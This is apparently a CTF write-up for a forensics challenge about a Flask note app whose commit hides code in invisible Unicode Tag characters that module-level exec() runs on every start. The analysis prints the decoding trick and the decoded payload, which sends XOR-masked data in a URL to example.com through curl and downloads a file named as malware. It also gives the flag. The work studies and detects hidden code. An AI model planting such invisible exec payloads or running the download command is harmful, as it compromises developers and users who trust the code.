# Clear as Glass - Forensics/Rev Eng (500 points)

**Flag:** `cdctf{G1455w0rM_w4s_pr3tTy_c0oL}`
**Materials:** repo `https://github.com/shkorodi/notekeeper` (8 commits, `main` at `a531ea3`), artifact `files/app.py` (5,311 B, SHA256 `a089e78dab3ce7ca45f6303d380ba077e0fcbbd6e266474fa4bad334c63e4eaf`)
**Author:** b0b

## Challenge

The repo owner reports being hacked mid-development of a Flask note-taking app: an attacker allegedly edited the code before the push, yet nothing showed up in the diff. The challenge provides a public GitHub repository, no binary and no network service. The task is to identify the change the attacker introduced and extract the flag string it hides.

## Analysis

The clone contains 8 commits on `main`, no tags, and no dangling objects reported by `git fsck --full --dangling`. Three refs point to `a531ea371475532d0a6aef72a051d3bd44d1c689`. The payload can be investigated in the available commits; a fresh clone cannot establish whether the remote was ever force-pushed.

Commit list:

```text
a531ea3 Document features and test instructions
21d8072 Add pytest suite
70c928f Add JSON API and error pages
bd75399 Tagging and search
ca3d3e2 Add helpers module for tag parsing and text truncation
5e67f7a Add edit and delete routes
07a4c71 Add Flask skeleton with sqlite-backed notes
28d32d5 Initial commit
```

The anomaly in `app.py` at HEAD is the block of tag-related lines:

```python
notes_list = "<425 characters, renders as an empty string>"
tags_list = ""
...
for note in notes_list:
    tags_list += chr(ord(note)-0xE0000)
...
def _tags_for(db, note_ids):
    ...
exec(tags_list)
```

`notes_list` is used nowhere else except the loop that builds `tags_list`, and `exec(tags_list)` sits at module level, so it runs on import, i.e. every app start. The offset `0xE0000` matches the start of the Unicode Tag block: U+E0020-U+E007E maps exactly onto ASCII 0x20-0x7E, and U+E000A is a newline. The whole block is zero-width, not rendered in the editor and GitHub diff views inspected, so line 6 looks like an empty string. `app.py` holds 395 characters in U+E00xx, all of them on line 6 (425 characters, 1611 bytes); the other 13 files of the repo hold 0.

## Approaches tried

`analysis/scan_hidden_unicode.py` scans the working tree, every blob in history, and every commit message with author and committer:

1. **Unreferenced objects in the clone:** `git fsck --full --dangling` reports none, and all 45 objects are in one pack. The clone reflog records only the clone operation, not earlier remote ref changes.
2. **Payload stored in an object no ref points at**: `git cat-file --batch-all-objects --batch-check` enumerates all 45 objects, and only two `app.py` blobs carry hidden characters. Ruled out.
3. **Stego in commit messages, author or committer names and emails**: the scan returns 0 tag characters and 0 zero-width/bidi characters across all 8 commits. Ruled out.
4. **Classical zero-width characters** (U+200B-U+200F, U+202A-U+202E, U+2060, U+FEFF): 0 in every file. The real channel is U+E00xx.
5. **Malicious code in another file** (templates, static, tests, `db.py`, `helpers.py`): `git grep -nE "exec\(|eval\(|subprocess|os\.system|base64"` over all revisions returns only `exec(tags_list)`, in the four `app.py` versions from `bd75399` onward. Ruled out.
6. **Executing the payload to catch the request**: `example.com` is an RFC 2606 reserved domain and the path is the flag XORed with `random.randbytes(32)`, so each run emits a different URL. The solution is static analysis with no network access.

## Solution

**Step 1 - Locate the infected commit.** Count tag characters in `app.py` for every commit:

```python
import subprocess, re
for c in subprocess.run(["git", "rev-list", "--reverse", "--all"],
                        capture_output=True, text=True).stdout.split():
    meta = subprocess.run(["git", "log", "-1", "--format=%h %ad %s", "--date=short", c],
                          capture_output=True, text=True).stdout.strip()
    r = subprocess.run(["git", "show", f"{c}:app.py"], capture_output=True)
    n = len(re.findall(r"[\U000E0000-\U000E0FFF]",
                       r.stdout.decode("utf-8", "replace"))) if r.returncode == 0 else "-"
    print(f"{n:>5}  {meta}")
```

```text
      -  28d32d5 2026-03-02 Initial commit
      0  07a4c71 2026-03-02 Add Flask skeleton with sqlite-backed notes
      0  5e67f7a 2026-03-05 Add edit and delete routes
      0  ca3d3e2 2026-03-11 Add helpers module for tag parsing and text truncation
    395  bd75399 2026-03-17 Tagging and search
    395  70c928f 2026-03-19 Add JSON API and error pages
    395  21d8072 2026-03-24 Add pytest suite
    395  a531ea3 2026-03-26 Document features and test instructions
```

`bd75399` is the first commit containing the payload and the only one adding `notes_list`, the `chr(ord(note)-0xE0000)` loop and `exec(tags_list)`. Two blobs carry the payload: `e8343c21ab71a55cbee4424fc938d0091a0d0951` (`app.py` at `bd75399`) and `c68a8cd93bf573e079f24a0fa028a0b00ced0988` (`app.py` from `70c928f` to HEAD).

**Step 2 - Rebuild the payload.** Reassemble ASCII from the hidden characters using the same arithmetic as the loop in the source:

```python
import re, pathlib
src = pathlib.Path("files/app.py").read_text(encoding="utf-8")
tags = [c for c in src if 0xE0000 <= ord(c) <= 0xE0FFF]
payload = "".join(chr(ord(c) - 0xE0000) for c in tags)
print(len(tags))
print(payload)
```

`print(len(tags))` returns `395`. The rebuilt string:

```python
f=bytes.fromhex("04266506711a20733247221657304b2d6055141d76002415333b5911270e2b3f")
k=bytes.fromhex("6742067217616742067217616742067217616742067217616742067217616742")
fl=bytes(a ^ b for a, b in zip(k, f))
import random, subprocess
e=random.randbytes(32)
u=f"https://example.com/{bytes.hex(bytes(a ^ b for a, b in zip(e, fl)))}"
subprocess.run(["curl", "-o", "./this_would_be_malware.exe", u])
```

Three things happen here: `fl = f XOR k` is the data the attacker wants out; `e = random.randbytes(32)` then `hex(e XOR fl)` is placed in the URL path, hiding the exfiltrated content from logs and making the request non-reproducible; `subprocess.run(["curl", "-o", ...])` downloads a binary named `this_would_be_malware.exe`, and the payload stops at the download. Because `exec(tags_list)` is at module level, the whole chain runs on every app start without any route being called.

**Step 3 - Verification.** The flag is `fl`, that is `f XOR k`:

```python
import re, pathlib
src = pathlib.Path("files/app.py").read_text(encoding="utf-8")
tags = [c for c in src if 0xE0000 <= ord(c) <= 0xE0FFF]
payload = "".join(chr(ord(c) - 0xE0000) for c in tags)
f = bytes.fromhex(re.search(r'f=bytes\.fromhex\("([0-9a-f]+)"\)', payload).group(1))
k = bytes.fromhex(re.search(r'k=bytes\.fromhex\("([0-9a-f]+)"\)', payload).group(1))
print(len(f), len(k))
print("flag:", bytes(a ^ b for a, b in zip(k, f)).decode())
```

```text
395
32 32
flag: cdctf{G1455w0rM_w4s_pr3tTy_c0oL}
```

Both blobs are 32 bytes, the XOR yields a fully printable string matching `cdctf{...}` with the leetspeak structure the challenge describes. `k` repeats a 6-byte period `67 42 06 72 17 61` while `f` does not, Their roles follow from the XOR operation in the payload.

## Result

```bash
python exploit.py files/app.py
```

```text
[*] 4126 ky tu trong file, 395 ky tu an U+E0000-U+E0FFF
[*] payload tai lap duoc tu `exec(tags_list)`:

f=bytes.fromhex("04266506711a20733247221657304b2d6055141d76002415333b5911270e2b3f")
k=bytes.fromhex("6742067217616742067217616742067217616742067217616742067217616742")
fl=bytes(a ^ b for a, b in zip(k, f))
import random, subprocess
e=random.randbytes(32)
u=f"https://example.com/{bytes.hex(bytes(a ^ b for a, b in zip(e, fl)))}"
subprocess.run(["curl", "-o", "./this_would_be_malware.exe", u])

[*] len(f)=32 len(k)=32
[*] XOR(f, k): b'cdctf{G1455w0rM_w4s_pr3tTy_c0oL}'
[+] co: cdctf{G1455w0rM_w4s_pr3tTy_c0oL}
[+] da luu flag.txt
```

## Reproduce

```bash
git clone https://github.com/shkorodi/notekeeper.git
git -C notekeeper cat-file blob HEAD:app.py > files/app.py
python exploit.py files/app.py
python analysis/scan_hidden_unicode.py notekeeper
```

`files/app.py` is the raw git blob (LF). Checking it out on Windows with `core.autocrlf=true` produces a 5,429-byte CRLF copy; the hidden characters are unaffected, so both decode.
